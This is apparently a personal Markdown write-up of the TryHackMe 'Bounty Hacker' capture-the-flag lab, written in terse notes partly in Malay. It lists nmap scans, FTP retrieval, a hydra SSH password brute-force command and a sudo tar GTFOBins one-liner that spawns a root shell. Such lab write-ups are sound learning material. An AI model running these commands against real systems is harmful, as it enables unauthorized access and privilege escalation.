---
date:
  created: 2023-12-19
  updated: 2023-12-19
description: THM-BountyHacker(easy) Writeup
tags:
  - ftp
  - gobuster
  - hydra
  - linpeas
  - gtfobins
comments: true
---

# Bounty Hacker

## Recon
nmap -p- --min-rate 5000 $IP
nmap -sCV -p 21,22,80 $IP

## Enumeration
masuk web, godek2
try fuzzing directory. takde apa2
ftp $IP
get all the file in ftp using `get` 

## Exploitation
`hydra -l lin -P locks.txt ssh://$IP`

## Privesc
letak linpeas
sudo pkexec /bin/sh xberjaya
sudo -l
tar gtfobins
`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`